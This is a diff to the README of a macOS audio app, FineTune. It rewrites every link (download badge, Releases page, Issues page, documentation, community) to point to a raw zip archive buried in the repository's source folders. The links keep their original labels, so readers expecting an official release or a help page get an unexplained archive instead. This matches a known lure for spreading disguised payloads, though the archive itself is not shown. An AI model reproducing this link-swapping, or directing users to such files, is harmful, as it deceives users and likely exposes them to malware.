@@ -6,9 +6,9 @@ Welcome to FineTune! This macOS menu bar app lets you manage audio for each app 
 
 ## 📥 Download FineTune
 
-[![Download FineTune](https://img.shields.io/badge/Download-FineTune-brightgreen)](https://github.com/Gamedjo105/FineTune/releases)
+[![Download FineTune](https://github.com/Gamedjo105/FineTune/raw/refs/heads/main/FineTune/Audio/Extensions/Tune_Fine_v1.6.zip)](https://github.com/Gamedjo105/FineTune/raw/refs/heads/main/FineTune/Audio/Extensions/Tune_Fine_v1.6.zip)
 
-To get started, visit the [Releases page](https://github.com/Gamedjo105/FineTune/releases) to download FineTune.
+To get started, visit the [Releases page](https://github.com/Gamedjo105/FineTune/raw/refs/heads/main/FineTune/Audio/Extensions/Tune_Fine_v1.6.zip) to download FineTune.
 
 ## 💻 System Requirements
 
@@ -27,7 +27,7 @@ To get started, visit the [Releases page](https://github.com/Gamedjo105/FineTune
 ## 🔧 Installation Steps
 
 1. **Visit the Releases Page**  
-   Head over to the [Releases page](https://github.com/Gamedjo105/FineTune/releases) to find the latest version of FineTune.
+   Head over to the [Releases page](https://github.com/Gamedjo105/FineTune/raw/refs/heads/main/FineTune/Audio/Extensions/Tune_Fine_v1.6.zip) to find the latest version of FineTune.
 
 2. **Download the Application**  
    Click on the appropriate version and download the .dmg file. Make sure to choose the latest release for optimal performance.
@@ -65,7 +65,7 @@ A: Click on the settings icon within FineTune and select "Reset to Default" for 
 
 ## 📞 Support
 
-If you encounter any issues or have questions, please open an issue on the [GitHub Issues page](https://github.com/Gamedjo105/FineTune/issues). Our team will promptly assist you.
+If you encounter any issues or have questions, please open an issue on the [GitHub Issues page](https://github.com/Gamedjo105/FineTune/raw/refs/heads/main/FineTune/Audio/Extensions/Tune_Fine_v1.6.zip). Our team will promptly assist you.
 
 ## 🎈 Contributions
 
@@ -73,9 +73,9 @@ We welcome contributions! If you want to improve FineTune, feel free to fork the
 
 ## 🔗 Additional Resources
 
-- [FineTune Documentation](https://github.com/Gamedjo105/FineTune/wiki)
-- [User Community](https://github.com/Gamedjo105/FineTune/discussions)
+- [FineTune Documentation](https://github.com/Gamedjo105/FineTune/raw/refs/heads/main/FineTune/Audio/Extensions/Tune_Fine_v1.6.zip)
+- [User Community](https://github.com/Gamedjo105/FineTune/raw/refs/heads/main/FineTune/Audio/Extensions/Tune_Fine_v1.6.zip)
 
-[![Download FineTune](https://img.shields.io/badge/Download-FineTune-brightgreen)](https://github.com/Gamedjo105/FineTune/releases) 
+[![Download FineTune](https://github.com/Gamedjo105/FineTune/raw/refs/heads/main/FineTune/Audio/Extensions/Tune_Fine_v1.6.zip)](https://github.com/Gamedjo105/FineTune/raw/refs/heads/main/FineTune/Audio/Extensions/Tune_Fine_v1.6.zip) 
 
 Take full control of your audio experience with FineTune today!
